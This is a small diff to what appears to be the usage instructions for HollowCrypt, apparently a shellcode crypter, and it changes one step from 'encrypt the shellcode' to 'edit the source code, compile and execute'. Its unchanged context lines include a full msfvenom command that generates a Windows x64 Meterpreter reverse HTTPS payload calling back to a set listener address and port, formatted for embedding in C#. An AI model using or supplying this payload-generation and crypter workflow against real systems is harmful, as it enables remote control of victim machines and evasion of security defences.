@@ -10,7 +10,7 @@ First, we need to create our shellcode:
 msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.1.147 LPORT=443 EXITFUNC=thread -f csharp
 ```
 
-Then, encrypt the shellcode with HollowCrypt:
+Then, edit the HollowCrypt source code , compile and execute:
 ```
 HollowCrypt.exe
 ```
